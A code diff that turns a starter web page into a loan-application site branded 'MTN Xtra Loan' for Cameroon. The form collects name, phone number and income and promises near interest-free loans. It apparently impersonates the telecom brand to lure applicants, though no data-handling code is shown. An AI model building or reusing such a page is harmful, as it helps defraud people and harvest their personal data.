@@ -3,16 +3,148 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>My First Website</title>
+    <title>MTN Xtra Loan</title>
     <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
 </head>
 <body>
-    <div class="container">
-        <h1>Hello, Render! 👋</h1>
-        <p>This is my website, hosted for free on Render via GitHub.</p>
-        <button id="myButton">Click Me</button>
-        <p id="message"></p>
+
+    <!-- Language Selection Screen -->
+    <div id="language-screen" class="screen active">
+        <div class="card">
+            <h2>Choose your language</h2>
+            <p>Select your language to continue</p>
+            <button class="lang-btn" onclick="startApp()">🇬🇧 English</button>
+            <button class="lang-btn" onclick="startApp()">🇫🇷 Français</button>
+            <button class="lang-btn" onclick="startApp()">🇨🇲 Camfranglais</button>
+            <p class="small-text">You can change it anytime</p>
+        </div>
     </div>
+
+    <!-- Main App (Hidden initially) -->
+    <div id="main-app" class="screen">
+        
+        <!-- Header -->
+        <header>
+            <div class="logo"><i class="fas fa-sim-card"></i> MTN Xtra Loan</div>
+            <div class="tagline">Easy Loan</div>
+        </header>
+
+        <!-- Home / Calculator Screen -->
+        <div id="home-screen" class="content active">
+            <h2>Welcome to MTN Xtra Loan</h2>
+            <p>Get loans easily through MTN Xtra Loan Cameroon</p>
+            
+            <div class="calculator">
+                <h3>Loan Calculator</h3>
+                <label>Amount: <span id="amount-display">XAF 1,000,000</span></label>
+                <input type="range" id="loan-amount" min="500000" max="5000000" step="100000" value="1000000">
+                <div class="range-labels"><span>XAF 500,000</span><span>XAF 5,000,000</span></div>
+
+                <label>Term: <span id="term-display">48 Months</span></label>
+                <input type="range" id="loan-term" min="12" max="48" step="12" value="48">
+                
+                <div class="payment-box">
+                    <p>Monthly Payment</p>
+                    <h3 id="monthly-payment">XAF 20,834</h3>
+                </div>
+
+                <button class="btn-primary" onclick="goToStep(1)">START APPLICATION</button>
+            </div>
+        </div>
+
+        <!-- Application Form -->
+        <div id="form-screen" class="content">
+            <div class="progress-bar"><div id="progress" style="width: 33%;"></div></div>
+            <p id="step-indicator">Step 1 of 3</p>
+
+            <!-- Step 1 -->
+            <div id="step-1" class="form-step active">
+                <h3>Loan Details</h3>
+                <label>Loan Type</label>
+                <select id="loan-type">
+                    <option>Business Loan</option>
+                    <option>Personal Loan</option>
+                    <option>Emergency Loan</option>
+                    <option>Education Loan</option>
+                </select>
+
+                <label>Loan Amount (XAF)</label>
+                <input type="number" id="form-amount" value="1000000">
+
+                <label>Loan Term</label>
+                <select id="form-term">
+                    <option>12 Months</option>
+                    <option>24 Months</option>
+                    <option>36 Months</option>
+                    <option>48 Months</option>
+                </select>
+
+                <label>Purpose of Loan</label>
+                <input type="text" id="loan-purpose" placeholder="e.g., Business expansion">
+
+                <button class="btn-primary" onclick="nextStep(2)">NEXT STEP</button>
+            </div>
+
+            <!-- Step 2 -->
+            <div id="step-2" class="form-step">
+                <h3>Personal Details</h3>
+                <label>First Name</label>
+                <input type="text" id="first-name" placeholder="First Name">
+
+                <label>Last Name</label>
+                <input type="text" id="last-name" placeholder="Last Name">
+
+                <label>Phone Number (Cameroon)</label>
+                <div class="phone-input">
+                    <span>+237</span>
+                    <input type="tel" id="phone" placeholder="9 digits without prefix (e.g., 670123456)">
+                </div>
+
+                <div class="btn-row">
+                    <button class="btn-secondary" onclick="goToStep(1)">BACK</button>
+                    <button class="btn-primary" onclick="nextStep(3)">NEXT STEP</button>
+                </div>
+            </div>
+
+            <!-- Step 3 -->
+            <div id="step-3" class="form-step">
+                <h3>Employment Details</h3>
+                <label>Employment Status</label>
+                <select id="employment-status">
+                    <option>Self-employed</option>
+                    <option>Employed full-time</option>
+                    <option>Employed part-time</option>
+                    <option>Student</option>
+                    <option>Unemployed</option>
+                </select>
+
+                <label>Annual Income (XAF)</label>
+                <input type="number" id="annual-income" placeholder="e.g., 5000000">
+
+                <div class="summary-box">
+                    <h4>Application Summary</h4>
+                    <p><strong>Loan Amount:</strong> <span id="summary-amount">XAF 1,000,000</span></p>
+                    <p><strong>Loan Term:</strong> <span id="summary-term">48 Months</span></p>
+                    <p><strong>Applicant:</strong> <span id="summary-name">—</span></p>
+                </div>
+
+                <div class="btn-row">
+                    <button class="btn-secondary" onclick="goToStep(2)">BACK</button>
+                    <button class="btn-primary" id="submit-btn">SUBMIT APPLICATION</button>
+                </div>
+            </div>
+        </div>
+
+        <!-- Processing Screen -->
+        <div id="processing-screen" class="content processing">
+            <h2>Processing Application</h2>
+            <p>Please wait, this may take a few seconds</p>
+            <div class="loader"></div>
+        </div>
+
+    </div>
+
     <script src="script.js"></script>
 </body>
 </html>
